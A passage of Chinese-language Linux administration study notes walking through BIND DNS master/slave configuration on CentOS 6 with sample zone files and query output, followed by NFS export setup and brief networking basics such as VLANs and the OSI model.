;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 5, ADDITIONAL: 5

;; QUESTION SECTION:
;baidu.com.			IN	MX

;; ANSWER SECTION:
baidu.com.		5405	IN	MX	20 jpmx.baidu.com.
baidu.com.		5405	IN	MX	20 mx50.baidu.com.
baidu.com.		5405	IN	MX	10 mx.n.shifen.com.
baidu.com.		5405	IN	MX	20 mx1.baidu.com.

;; AUTHORITY SECTION:
baidu.com.		170742	IN	NS	ns4.baidu.com.
baidu.com.		170742	IN	NS	dns.baidu.com.
baidu.com.		170742	IN	NS	ns3.baidu.com.
baidu.com.		170742	IN	NS	ns7.baidu.com.
baidu.com.		170742	IN	NS	ns2.baidu.com.

;; ADDITIONAL SECTION:
dns.baidu.com.		170742	IN	A	202.108.22.220
ns2.baidu.com.		170742	IN	A	61.135.165.235
ns3.baidu.com.		170742	IN	A	220.181.37.10
ns4.baidu.com.		170742	IN	A	220.181.38.10
ns7.baidu.com.		170742	IN	A	119.75.219.82

;; Query time: 0 msec
;; SERVER: 192.168.20.134#53(192.168.20.134)
;; WHEN: Mon Jun  6 15:14:56 2016
;; MSG SIZE  rcvd: 287
	#+END_SRC

	#+BEGIN_SRC sh
[root@master01 ~]# dig mx50.baidu.com.

; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.37.rc1.el6_7.7 <<>> mx50.baidu.com.
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 45425
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 5, ADDITIONAL: 5

;; QUESTION SECTION:
;mx50.baidu.com.			IN	A

;; ANSWER SECTION:
mx50.baidu.com.		300	IN	A	220.181.50.208

;; AUTHORITY SECTION:
baidu.com.		170663	IN	NS	dns.baidu.com.
baidu.com.		170663	IN	NS	ns7.baidu.com.
baidu.com.		170663	IN	NS	ns2.baidu.com.
baidu.com.		170663	IN	NS	ns4.baidu.com.
baidu.com.		170663	IN	NS	ns3.baidu.com.

;; ADDITIONAL SECTION:
dns.baidu.com.		170663	IN	A	202.108.22.220
ns2.baidu.com.		170663	IN	A	61.135.165.235
ns3.baidu.com.		170663	IN	A	220.181.37.10
ns4.baidu.com.		170663	IN	A	220.181.38.10
ns7.baidu.com.		170663	IN	A	119.75.219.82

;; Query time: 31 msec
;; SERVER: 192.168.20.134#53(192.168.20.134)
;; WHEN: Mon Jun  6 15:16:15 2016
;; MSG SIZE  rcvd: 218
	#+END_SRC

	现在查询mx50.baidu.com.(220.181.50.228)的反解，
	#+BEGIN_SRC sh
dig -x 220.181.50.208

; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.37.rc1.el6_7.7 <<>> -x 220.181.50.208
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 42391
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;208.50.181.220.in-addr.arpa.	IN	PTR

;; ANSWER SECTION:
208.50.181.220.in-addr.arpa. 5	IN	PTR	mx50.baidu.com.

;; Query time: 5 msec
;; SERVER: 192.168.19.2#53(192.168.19.2)
;; WHEN: Mon Jun  6 15:18:16 2016
;; MSG SIZE  rcvd: 73
	#+END_SRC

	PTR就是PoinTeR反解，查询IP所对应的主机名，后面对应的是主机名，主机
	名尽量使用完整FQDN，亦即末尾加上(.)。

	比如"208.50.181.220"反解要写成"208.50.181.220.in-addr.arpa."这样的
	zone名称才行。
*** DNS相关基本知识
	要让我们的主机名对应IP且能够让网络上的计算机都可以查询到的话，有以下选择：
	1. 在域名提供商处修改并设定自己的DNS
	2. 直接使用域名提供商提供的DNS服务器
	3. 使用第三方专业提供的DNS服务器

    两个知识点：
	1. 一个是记录服务器所在的NS（NameServer）记录
	2. 一个是记录主机名对应的A（Address）记录

	如果要添加新的解析记录，我们应该做哪些？
	1. 针对要修改的zone，添加相应的RR记录
	2. 更改zone file的serial，SOA的第三个参数，slave更新与否就看这个参数的变化了
	3. 重新加载named配置文件
	4. 查看日志
**** 正解、反解、zone
	 正解：主机名查询到IP的流程

	 反解：IP反解析到主机名的流程

	 Zone：不管是正解还是反解，每个domain的记录就是区域（zone）

	 一台DNS服务器可以管理多个domain，不管是正解还是反解

	 正解相关：
	 SOA：（Start of Authority）起始授权机构

	 NS：NameServer，记录的是DNS服务器

	 A：Address，记录的是IP

	 反解相关：
	 反解是由IP找主机名，所以重点是IP的所有人是谁

	 AS自治系统（Autonomous System）是指使用统一内部路由协议的一组网络。
	 如果成员单位的网络路由器准备采用EGP（Exterior Gateway Protocol）、
	 BGP（Border Gateway Protocol）或IDRP（OSI Inter-Domain Routing
	 Protocol）协议，可以申请AS号码。一般如果该单位的网络规模比较大或
	 者将来会发展成较大规模的网络，而且有多个出口，建议建立成一个自治
	 系统，这样就需要AS号码。如果网络规模较小，或者规模较为固定，而且
	 只有一个出口，可采用静态路由或其他路由协议，这样就不需要AS号码。

	 IP都是IDC提供的，所以反解只能找IDC来做。除非我们有整个C段的IP，
	 ISP有可能给我们反解的授权。

	 PTR：PoinTeR的缩写
**** hint、master/slave
	 每个DNS都需要的正解zone：hint

	 记录 . 的zone的类型，就是hint

	 反解的需求，基本上是集中在mail上。

	 Master/Slave DNS

	 Master：从位于本机的文件中读取区数据，zone信息由管理员手动修改与
	 设定，修改后要重启DNS服务或重新加载zone文件，zone文件内容会同步到
	 slave DNS上。

	 Slave：从Master上定期自动同步zone文件及内容更新，定时向Master查看序列号

	 序列号：Master修改内容后，需要增加序列号，重启DNS服务，Master会主
	 动告知Slave更新。
**** 客户端的设置
***** 配置文件
	  /etc/hosts: 这是早期hostname对应IP的文件

	  /etc/resolv.conf: 这是记录DNS服务器的文件

	  /etc/nsswitch.conf: 这个是决定优先级

	  #+BEGIN_SRC sh
grep hosts /etc/nsswitch.conf
#hosts:    db files nisplus dns
hosts:    files dns
	  #+END_SRC

	  DNS至少设置2个，虽然一般情况下只有第一部会被接收查询，但尽量不要多填。

	  获取根域名的方法：
	  #+BEGIN_SRC sh
# 1: 
dig > name.root
wget http://ftp.internic.net/domain/named.root
	  #+END_SRC
**** cache-only与forwarding DNS
	 cache-only服务器：仅有"."这个zone  file的简单DNS，没有自己的DNS服
	 务器，只有缓存查询结果的功能。

	 forwarding服务器：指定一台上层DNS服务器作为forwarding目标。

	 如何设置cache-only与forwarding？很简单，因为不需要设定正反解的
	 zone文件，所以只需要设定一下named.conf配置文件即可。其简单的配置如下：
	 #+BEGIN_SRC sh
# named.conf
options {
    listen-on port 53 { any; };
    directory         "/var/named";

    allow-query       { any; };
    recursion         yes;

    forward           only;
    forwarders        { 114.114.114.114; 8.8.8.8; 8.8.4.4; };
};
	 #+END_SRC

	 相关参数说明：
	 #+BEGIN_EXAMPLE
options: 与服务器环境相关的参数

listen-on port 53 { any; };
默认是监听在127.0.0.1，只有本机可以对DNS服务进行查询，这里要改成any。记得，因为
可以监听多个接口，因此any后面得要加上分号。另外，这个参数如果忘记写也没有关系，
因为默认是对整个主机系统的所有接口进行监听的。

directory "/var/named";
zone file放置在哪个目录下。

allow-query { any; };
这个是针对客户端，到底谁可以对我们的DNS服务提出查询请求。原本仅是针对localhost
开放而已，我们这里改成对所有的用户开放。不过，默认DNS就对所有用户方形，
所以这个设定的值可以不用填写。

forward only;
这个设置可以让我们的DNS服务器仅进行forward，即使有"."这个zone file的设置，也不会
使用"."的资料，只会将查询权交给上层DNS服务器而已，是cache only DNS最常见的设置。

forwarders        { 114.114.114.114; 8.8.8.8; 8.8.4.4; };
既然有forward only，那么到底要对哪部上层DNS服务器进行转发呢？
那就是forwarders（不要忘记最后的s）参数的重要性了。由于担心上层DNS服务器也有可能
会挂掉，因此可以设定多部上层DNS服务器，每一个forwarder服务器的IP都要有;来作为结尾。
	 #+END_EXAMPLE

	 Port 953：这是named的远程控制功能，rndc（remote name daemon control）

	 tcpdump抓包：
	 #+BEGIN_SRC sh
tcpdump -K dst port 53
	 #+END_SRC
*** 测试环境
	以下测试是在CentOS6U5 64位系统上进行测试，
    | 主机名                |         IP地址 | 备注          |
    |-----------------------+----------------+---------------|
    | master01.lavenliu.com | 192.168.20.134 | Primary DNS   |
    | minion01.lavenliu.com | 192.168.20.135 | Secondary DNS |
    | minion02.lavenliu.com | 192.168.20.136 | Client        | 
*** 配置主DNS
**** 安装bind软件包
	 #+BEGIN_SRC sh
yum install -y bind bind-utils
	 #+END_SRC
**** 配置主DNS/etc/named.conf
	 在options字段内做如下的修改及增加，
	 #+BEGIN_SRC sh
listen-on port 53 { 127.0.0.1; 192.168.20.134; }; // 192.168.20.134 is Master DNS Server IP
listen-on-v6 port 53 { ::1; };
directory	"/var/named";
dump-file	"/var/named/data/cache_dump.db";
	statistics-file "/var/named/data/named_stats.txt";
	memstatistics-file "/var/named/data/named_mem_stats.txt";
allow-query		{ localhost; 192.168.20.0/24; }; // IP range
allow-transfer	{ localhost; 192.168.20.135; }; // 192.168.20.135 is Slave DNS Server IP
	 #+END_SRC

	 主辅需要用到的配置：
	 #+BEGIN_EXAMPLE
allow-update { none; };
allow-transfer { 192.168.20.100; };
notify yes;
also-notify { 192.168.20.100; };
	 #+END_EXAMPLE
**** 配置主DNS/etc/named.rfc1912.zones
	 在此配置文件下追加如下几行，
	 #+BEGIN_SRC sh
cat >> /etc/named.rfc1912.zones <<EOF
zone "lavenliu.com" IN {
     type master;
     file "forward.lavenliu";
     allow-update { none; };
};

zone "20.168.192.in-addr.arpa" IN {
     type master;
     file "reverse.lavenliu";
     allow-update { none; };
};
EOF
	 #+END_SRC

	 这里需要注意zone的参数设定：
	 #+BEGIN_EXAMPLE
type:     三种zone类型，针对.的hint，需要手动修改的master，可自动更新的slave
file:     zone file的文件名
反解zone: 主要就是in-addr.arpa
	 #+END_EXAMPLE
**** 创建Zone文件
	 上一步骤，我们定义了两个区域文件，分别为forward.lavenliu及
	 reverse.lavenliu两个区域文件，
***** 创建正向区域文件
	  #+BEGIN_SRC sh
# vi /var/named/forward.lavenliu
$TTL 86400
@   IN  SOA     master01.lavenliu.com. root.lavenliu.com. (
		        2016051201  ;Serial
				3600        ;Refresh
				1800        ;Retry
				604800      ;Expire
				86400       ;Minimum TTL
)
@       	IN  NS          master01.lavenliu.com.
@       	IN  NS          minion01.lavenliu.com.
@       	IN  A           192.168.20.134
@       	IN  A           192.168.20.135
@       	IN  A           192.168.20.136
master01    IN  A   		192.168.20.134
minion01    IN  A   		192.168.20.135
minion02    IN  A   		192.168.20.136
	  #+END_SRC
	  
	  正解文件一定要有的几个RR：
	  #+BEGIN_EXAMPLE
	  $ttl:             缓存时间
	  ORIGIN：          域名
	  SOA：             master/slave认证
	  A:                IP
	  NS：              Name Server
	  MX：              Mail eXchange
	  CNAME：           别名
	  #+END_EXAMPLE
	  
	  几个需要注意的地方：

	  数据一定要从行首开始，前面不可有空格

	  @代表zone的意思，在forward.lavenliu文件中，@代表lavenliu.com，

	  在reverse.lavenliu文件中，
	  @代表20.168.192.in-addr.arpa.的意思

	  . 代表完整主机名FQDN而不是仅有的hostname，在forward.lavenliu文件里写
	  master01.lavenliu.com则代表FQDN为master01.lavenliu.com.@ ==> master01.lavenliu.com.lavenliu.com.
	  此必须写成master01.lavenliu.com.或master01

	  关于 . 的说明：
	  加了 . 表示这是个FQDN，即hostname+domain name，如果没有加 . 的话，仅表示
	  该名称为hostname。
***** 创建反向区域文件
	  #+BEGIN_SRC sh
# vi /var/named/reverse.lavenliu
$TTL 86400
@   IN  SOA     master01.lavenliu.com. root.lavenliu.com. (
		        2016051201  ;Serial
				3600        ;Refresh
				1800        ;Retry
				604800      ;Expire
				86400       ;Minimum TTL
)
@       	IN  NS          master01.lavenliu.com.
@       	IN  NS          minion01.lavenliu.com.
@       	IN  PTR         lavenliu.com.
master01    IN  A   		192.168.20.134
minion01    IN  A   		192.168.20.135
minion02    IN  A   		192.168.20.136
134			IN	PTR			master01.lavenliu.com.
135			IN	PTR			minion01.lavenliu.com.
136			IN	PTR			minion02.lavenliu.com.
	  #+END_SRC

	  反解文件的设定：
	  反解和正解一样，都需要TTL、SOA、NS，但是相当于正解里的记录，反解仅有PTR。
**** 启动主DNS的bind服务
	 在启动之前，需要修改相应文件的权限，
	 #+BEGIN_SRC sh
chown -R named.named /var/named
[root@master01 named]# ll /var/named/
total 36
drwxrwx--- 2 named named 4096 Mar 16 21:25 data
drwxrwx--- 2 named named 4096 Mar 16 21:25 dynamic
-rw-r--r-- 1 named named  531 May 14 21:54 forward.lavenliu
-rw-r----- 1 named named 2075 Apr 23  2014 named.ca
-rw-r----- 1 named named  152 Dec 15  2009 named.empty
-rw-r----- 1 named named  152 Jun 21  2007 named.localhost
-rw-r----- 1 named named  168 Dec 15  2009 named.loopback
-rw-r--r-- 1 named named  564 May 14 21:57 reverse.lavenliu
drwxrwx--- 2 named named 4096 Mar 16 21:25 slaves
# 启动bind服务，在启动named服务前，最好检查一下语法正确性
named-checkconf /etc/named.conf # 没有输出是代表没有问题
# named-checkzone lavenliu.com /var/named/forward.lavenliu 
zone lavenliu.com/IN: loaded serial 2016051201
OK
# named-checkzone lavenliu.com /var/named/reverse.lavenliu 
zone lavenliu.com/IN: loaded serial 2016051201
OK
# named-checkzone 192.168.20 /var/named/reverse.lavenliu
zone 192.168.20/IN: loaded serial 2016051202
OK
/etc/init.d/named start 
	 #+END_SRC
**** 测试主DNS服务
	 接下来我们可以使用nslookup及dig工具进行测试域名的解析，包括正向解
	 析与反向解析。

	 测试之前可以查看iptables的规则，是否允许53端口的访问。这里的
	 iptables已经关闭了，所以不会存在这个问题。系统默认是存在nslookup
	 这个工具的，如果没有dig工具，可以安装如下软件包，
	 #+BEGIN_SRC sh
yum install -y bind-utils
	 #+END_SRC

	 接下来设置/etc/resolv.conf配置文件，添加一个nameserver为
	 192.168.20.134，接下来就可以进行测试了，
	 #+BEGIN_SRC sh
[root@master01 ~]# nslookup lavenliu.com
Server:		192.168.20.134
Address:	192.168.20.134#53

Name:	lavenliu.com
Address: 192.168.20.136
Name:	lavenliu.com
Address: 192.168.20.134
Name:	lavenliu.com
Address: 192.168.20.135

# 正向解析
[root@master01 ~]# nslookup master01.lavenliu.com
Server:		192.168.20.134
Address:	192.168.20.134#53

Name:	master01.lavenliu.com
Address: 192.168.20.134

[root@master01 ~]# nslookup minion01.lavenliu.com
Server:		192.168.20.134
Address:	192.168.20.134#53

Name:	minion01.lavenliu.com
Address: 192.168.20.135

[root@master01 ~]# nslookup minion02.lavenliu.com
Server:		192.168.20.134
Address:	192.168.20.134#53

Name:	minion02.lavenliu.com
Address: 192.168.20.136

# 使用dig进行正向解析
[root@master01 ~]# dig lavenliu.com

; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.37.rc1.el6_7.7 <<>> lavenliu.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 8813
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 2, ADDITIONAL: 2

;; QUESTION SECTION:
;lavenliu.com.			IN	A

;; ANSWER SECTION:
lavenliu.com.		86400	IN	A	192.168.20.134
lavenliu.com.		86400	IN	A	192.168.20.135
lavenliu.com.		86400	IN	A	192.168.20.136

;; AUTHORITY SECTION:
lavenliu.com.		86400	IN	NS	minion01.lavenliu.com.
lavenliu.com.		86400	IN	NS	master01.lavenliu.com.

;; ADDITIONAL SECTION:
master01.lavenliu.com.	86400	IN	A	192.168.20.134
minion01.lavenliu.com.	86400	IN	A	192.168.20.135

;; Query time: 0 msec
;; SERVER: 192.168.20.134#53(192.168.20.134)
;; WHEN: Sat May 14 22:18:28 2016
;; MSG SIZE  rcvd: 156

# 反向解析
[root@master01 ~]# nslookup 192.168.20.134
Server:		192.168.20.134
Address:	192.168.20.134#53

134.20.168.192.in-addr.arpa	name = master01.lavenliu.com.

[root@master01 ~]# nslookup 192.168.20.135
Server:		192.168.20.134
Address:	192.168.20.134#53

135.20.168.192.in-addr.arpa	name = minion01.lavenliu.com.

[root@master01 ~]# nslookup 192.168.20.136
Server:		192.168.20.134
Address:	192.168.20.134#53

136.20.168.192.in-addr.arpa	name = minion02.lavenliu.com.
	 #+END_SRC
	 
*** 配置辅DNS
	域名提供商在提供domain注册时，一般都提供两部DNS给大家。为了简化DNS
	管理人员的负担，使用Master/Slave DNS架构会带来很多方便。

	Slave DNS的特点：
	1. 为了不间断提供DNS服务，至少需要两部DNS服务器提供查询
	2. 这两部DNS应该分散在不同的网段或不同的机房
	3. 为方便管理，除一部为Master DNS外，其他的DNS使用slave模式
	4. Slave DNS本身没有zone file，其zone file是从master DNS同步而来
	5. 要传输的zone file在named.conf文件中设定
**** 安装bind软件包
	 #+BEGIN_SRC sh
yum install -y bind bind-utils
	 #+END_SRC
**** 配置辅DNS/etc/named.conf
	 #+BEGIN_SRC sh
    listen-on port 53 { 127.0.0.1; 192.168.20.135; };
    listen-on-v6 port 53 { ::1; };
    directory   "/var/named";
    dump-file   "/var/named/data/cache_dump.db";
        statistics-file "/var/named/data/named_stats.txt";
        memstatistics-file "/var/named/data/named_mem_stats.txt";
    allow-query     { localhost; 192.168.20.0/24; };
	 #+END_SRC
**** 配置辅DNS/etc/named.rfc1912.zones
	 #+BEGIN_SRC sh
zone "lavenliu.com" IN {
    type slave;
    file "slaves/lavenliu.fwd";
    masters { 192.168.20.134; };
};

zone "20.168.192.in-addr.arpa" IN {
    type slave;
    file "slaves/lavenliu.rev";
    masters { 192.168.20.134; };
};
	 #+END_SRC
**** 启动辅DNS服务
	 #+BEGIN_SRC sh
/etc/init.d/named start
# 启动named服务后，lavenliu.com的正向与反向区域文件会从主DNS同步到辅DNS上，
# 可以查看/var/named/slaves目录下是否有lavenliu.com的正向与反向区域文件
[root@minion01 named]# ll /var/named/slaves/
total 8
-rw-r--r-- 1 named named 481 May 14 22:40 lavenliu.fwd
-rw-r--r-- 1 named named 562 May 14 22:40 lavenliu.rev
	 #+END_SRC
	 有了以上两个文件，说明主辅DNS已经配置成功。可以查看一下两个配置文
	 件的内容，
	 #+BEGIN_SRC sh

# 查看正向区域文件
[root@minion01 ~]# cat /var/named/slaves/lavenliu.fwd 
$ORIGIN .
$TTL 86400	; 1 day
lavenliu.com		IN SOA	master01.lavenliu.com. root.lavenliu.com. (
				2016051201 ; serial
				3600       ; refresh (1 hour)
				1800       ; retry (30 minutes)
				604800     ; expire (1 week)
				86400      ; minimum (1 day)
				)
			NS	master01.lavenliu.com.
			NS	minion01.lavenliu.com.
			A	192.168.20.134
			A	192.168.20.135
			A	192.168.20.136
$ORIGIN lavenliu.com.
master01		A	192.168.20.134
minion01		A	192.168.20.135
minion02		A	192.168.20.136

# 查看反向区域文件内容
[root@minion01 ~]# cat /var/named/slaves/lavenliu.rev 
$ORIGIN .
$TTL 86400	; 1 day
20.168.192.in-addr.arpa	IN SOA	master01.lavenliu.com. root.lavenliu.com. (
				2016051201 ; serial
				3600       ; refresh (1 hour)
				1800       ; retry (30 minutes)
				604800     ; expire (1 week)
				86400      ; minimum (1 day)
				)
			NS	master01.lavenliu.com.
			NS	minion01.lavenliu.com.
			PTR	lavenliu.com.
$ORIGIN 20.168.192.in-addr.arpa.
134			PTR	master01.lavenliu.com.
135			PTR	minion01.lavenliu.com.
136			PTR	minion02.lavenliu.com.
master01		A	192.168.20.134
minion01		A	192.168.20.135
minion02		A	192.168.20.136
	 #+END_SRC
** NFS
*** NFS介绍与原理详解
**** 什么是NFS
	 NFS是Network File System的缩写，中文意思是网络文件系统。它的主要
	 功能是通过网络（一般是局域网）让不同的主机系统之间可以共享文件或
	 目录。NFS客户端（一般为应用服务器，例如web）可以通过挂载的方式将
	 NFS服务器端共享的数据目录挂载到NFS客户端本地系统中（就是某一个挂
	 载点）。从NFS客户端的机器本地看，NFS服务器端共享的目录就好像是客
	 户端自己的磁盘分区或者目录一样，而实际上却是远端的NFS服务器的目录。

	 NFS网络文件系统很像Windows系统的网络共享、安全功能、网络驱动器映
	 射，这也和Linux里的Samba服务类似。只不过一般情况，Windows网络共享
	 服务或者Samba服务用于办公局域网共享，互联网中小型网站集群架构后端
	 常用NFS作为数据共享，如果是大型网站，那么有可能还会用到更复杂的分
	 布式文件系统，如：MooseFS（mfs）、GlusterFS、FastDFS等。
*** NFS企业集群应用场景
	在企业集群架构的工作场景中，NFS网络文件系统一般被用来存储共享视频、
	图片、附件等静态资源文件，一般是把网站用户上传的文件都放到NFS共享
	里，例如，BBS产品的图片、附件、头像，注意
	网站BBS程序不要放在NFS共享里，然后前端所有的节点访问这些静态
	资源时都会读取NFS存储上的资源。NFS是当前互联网系统架构中
	最常用的数据存储服务之一，特别是中小型网站公司应用频率更高。
	大公司或门户除了使用NFS外，还可能会使用更为复杂的分布式文件系统
	MooseFS（MFS）、GlusterFS、FastDFS等。
*** NFS集群环境搭建准备
    | 主机名             |         IP地址 | 说明      |
    |--------------------+----------------+-----------|
    | lb01.lavenliu.com  | 192.168.20.150 | NFS客户端 |
    | lb02.lavenliu.com  | 192.168.20.151 | NFS客户端 |
    | web01.lavenliu.com | 192.168.20.152 | NFS服务端 |
    | web02.lavenliu.com | 192.168.20.153 | NFS服务端 |
*** 开始安装NFS系统
**** NFS服务端设置
	 要部署NFS服务，需要安装下面的软件包，
	 1. nfs-utils
		#+BEGIN_EXAMPLE
		这个是NFS服务主程序，包括rpc.nfsd及rpc.mountd两个守护进程，
		和相关文档说明及执行命令文件等。
		#+END_EXAMPLE
	 2. rpcbind
		#+BEGIN_EXAMPLE
		CentOS6.x下面RPC的主程序（CentOS5.x下面为portmap）
		#+END_EXAMPLE

     NFS可以被视为一个RPC程序，在启动任何一个RPC程序之前，需要做好
	 端口

	 检查系统是否安装以上两个软件包，
	 #+BEGIN_SRC sh
# rpm -qa |egrep "rpcbind|nfs"
rpcbind-0.2.0-11.el6.x86_64
nfs4-acl-tools-0.3.3-6.el6.x86_64
nfs-utils-1.2.3-39.el6.x86_64
nfs-utils-lib-1.1.5-6.el6.x86_64
	 #+END_SRC

	 首先启动rpcbind服务，
	 #+BEGIN_SRC sh
# 首先启动rpcbind服务
[root@web02 ~]# grep "\<111\>" /etc/services
sunrpc          111/tcp         portmapper rpcbind      # RPC 4.0 portmapper TCP
sunrpc          111/udp         portmapper rpcbind      # RPC 4.0 portmapper UDP
[root@web02 ~]# lsof -i:111
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
rpcbind 3286  rpc    6u  IPv4  16864      0t0  UDP *:sunrpc 
rpcbind 3286  rpc    8u  IPv4  16867      0t0  TCP *:sunrpc (LISTEN)
rpcbind 3286  rpc    9u  IPv6  16869      0t0  UDP *:sunrpc 
rpcbind 3286  rpc   11u  IPv6  16872      0t0  TCP *:sunrpc (LISTEN)
# /etc/init.d/nfs status
rpc.svcgssd is stopped
rpc.mountd is stopped
nfsd is stopped
rpc.rquotad is stopped
# /etc/init.d/nfs start
Starting NFS services:                                     [  OK  ]
Starting NFS quotas:                                       [  OK  ]
Starting NFS mountd:                                       [  OK  ]
Starting NFS daemon:                                       [  OK  ]
Starting RPC idmapd:                                       [  OK  ]
# netstat -antup |grep 2049
tcp        0      0 0.0.0.0:2049                0.0.0.0:*                   LISTEN      -                   
tcp        0      0 :::2049                     :::*                        LISTEN      -                   
udp        0      0 0.0.0.0:2049                0.0.0.0:*                               -                   
udp        0      0 :::2049                     :::*                                    -
# rpcbind -p localhost
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100011    1   udp    875  rquotad
    100011    2   udp    875  rquotad
    100011    1   tcp    875  rquotad
    100011    2   tcp    875  rquotad
    100005    1   udp  39808  mountd
    100005    1   tcp  44943  mountd
    100005    2   udp  34282  mountd
    100005    2   tcp  42093  mountd
    100005    3   udp  51793  mountd
    100005    3   tcp  51031  mountd
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    2   tcp   2049  nfs_acl
    100227    3   tcp   2049  nfs_acl
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100227    2   udp   2049  nfs_acl
    100227    3   udp   2049  nfs_acl
    100021    1   udp  55534  nlockmgr
    100021    3   udp  55534  nlockmgr
    100021    4   udp  55534  nlockmgr
    100021    1   tcp  36572  nlockmgr
    100021    3   tcp  36572  nlockmgr
    100021    4   tcp  36572  nlockmgr
	 #+END_SRC
**** NFS客户端设置
*** 启动NFS及相关知识
*** NFS的多种服务进程介绍
*** NFS服务端配置详解及实战配置
	NFS默认配置文件是/etc/exports，安装NFS完毕，还未使用NFS时，该文件
	是没有配置的。/etc/exports文件的配置格式为，
	#+BEGIN_EXAMPLE
	NFS共享目录 NFS客户端地址(参数1,参数2,...) NFS客户端地址(参数1,参数2,...)
	/data 192.168.20.0/24(rw,sync)
	#+END_EXAMPLE
	
	配置完毕，重新加载nfs配置文件，
	#+BEGIN_SRC sh
# /etc/init.d/nfs reload
	#+END_SRC
*** NFS客户端配置详解及实战配置
	#+BEGIN_SRC sh
# showmount -e 192.168.20.152
Export list for 192.168.20.152:
/data 192.168.20.0/24
# 客户端挂载
# mount -t nfs 192.168.20.152:/data /mnt
# 进行文件的创建
# cd /mnt
# touch test
touch: cannot touch `test': Permission denied
# 之所以不能创建文件，是由于服务端的默认配置导致的，
# 可以查看一下服务端的默认配置
nfs-server# cat /var/lib/nfs/etab 
/data	192.168.20.0/24(rw,sync,wdelay,hide,nocrossmnt,secure,root_squash,no_all_squash,no_subtree_check,secure_locks,acl,anonuid=65534,anongid=65534)
# 从上面可以看到，/data目录只允许uid和gid为65534的这个用户读写
# 从/etc/passwd文件查询这个id为65534的用户
# grep 65534 /etc/passwd
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
# 因此，以上的"Permission denied"问题，就可以解决了，如下操作，
# chown -R nfsnobody /data
# ll -d /data
drwxr-xr-x 2 nfsnobody root 4096 Feb 22 13:38 data
	#+END_SRC
*** 多个客户端读写一个共享存储的问题
*** NFS常见故障排查及解决方案
	学习思想：了解服务步骤的前提下，故意搞错一个地方，然后，观察提示，
	反推问题。
*** NFS服务端的权限参数详解
    | 参数名称       | 用途                                                            |
    |----------------+-----------------------------------------------------------------|
    | rw             | Read-Write，表示可读写权限                                      |
    |----------------+-----------------------------------------------------------------|
    | ro             | Read-Only，表示只读权限                                         |
    |----------------+-----------------------------------------------------------------|
    | sync           | NFS客户端请求或写入数据时，数据同步写入到NFS服务端的硬盘后      |
    |                | 才返回。 *数据安全不丢失；缺点：性能比不启用时要差*             |
    |----------------+-----------------------------------------------------------------|
    | async          | NFS客户端请求或写入数据时，先返回请求，再将数据写入到内存缓存和 |
    |                | 硬盘中， 即异步写入数据。此参数可以提升NFS性能，但是会降低      |
    |                | 数据的安全。因此，一般情况下不建议使用。如果NFS处于瓶颈状态，   |
    |                | 并且允许数据丢失的话，可以打开此参数以提升NFS性能。             |
    |                | 写入时数据会先写到内存缓冲区，等硬盘有空档再写入硬盘，这样可以  |
    |                | 提升写入效率。风险为若服务器宕机或不正常关机，会损失缓冲区      |
    |                | 未写入硬盘的数据（解决办法：服务器主板电池或加UPS不间断电源）   |
    |----------------+-----------------------------------------------------------------|
    | no_root_squash | 访问NFS服务端共享目录的用户如果是root的话，它对该共享目录具有   |
    |                | root权限。这个配置原本为无盘客户端准备的。用户避免使用。        |
    |----------------+-----------------------------------------------------------------|
    | root_squash    | 对于访问NFS服务端共享目录的用户如果是root的话，则他的权限将被   |
    |                | 压缩成匿名用户，同时他的UID和GID通常会变成nfsnobody账号身份。   |
    |----------------+-----------------------------------------------------------------|
    | all_squash     | 不管访问NFS服务端共享目录的身份如何，他的权限都将被压缩成匿名   |
    |                | 用户，同时他的UID和GID都会变成nfsnobody账号身份。在早期多个     |
    |                | NFS客户端同时读写NFS服务端数据时，这个参数很有用。              |
** NTP
* Network
** Internet示意图
** 局域网和广域网
   #+BEGIN_EXAMPLE
   局域网 花钱买设备 带宽有保证
   广域网 花钱买带宽
   #+END_EXAMPLE
*** VLAN
	以太网是一种基于CSMA/CD(Carrier Sense Multiple Access/Collision
	Detect，载波侦听多路访问/冲突检测)的共享通讯介质的数据网络通讯技
	术，当主机数目较多时会导致冲突严重、广播泛滥、性能显著下降甚至使
	网络不可用等问题。通过交换机实现LAN互联虽然可以解决冲突
	(Collision)严重的问题，但仍然不能隔离广播报文。在这种情况下出现
	了VLAN(Virtual Local Area Network，虚拟局域网)技术，这种技术可
	以把一个LAN划分成多个逻辑的LAN——VLAN，每个VLAN是一个广播域，VLAN
	内的主机间通信就和在一个LAN内一样，而VLAN间则不能直接互通，这样，
	广播报文被限制在一个VLAN内。

	VLAN的有点如下：
	+ 限制广播域。广播域被限制在一个VLAN内，节省了带宽，提高了网络处理能力。
	+ 增强局域网的安全性。VLAN间的二层报文是相互隔离的。如果不同VLAN
	  要进行通信，则需要通过路由器或三层交换机等三层设备。
	+ 灵活构建虚拟工作组。

	VLAN划分：
	+ 基于端口的VLAN
	+ 基于MAC地址的VLAN
	+ 基于协议的VLAN
	+ 基于IP子网的VLAN
	+ 基于策略的VLAN
	+ 其它VLAN
	 
** 服务器和客户机
** 网际互联模型
** 理解OSI参考模型
   1. 应用层
	  #+BEGIN_EXAMPLE
	  能够产生网络流量的应用程序
	  #+END_EXAMPLE
   2. 表示层
	  #+BEGIN_EXAMPLE
	  数据如何加密、压缩，传输时是二进制还是ASCII码
	  #+END_EXAMPLE
   3. 会话层
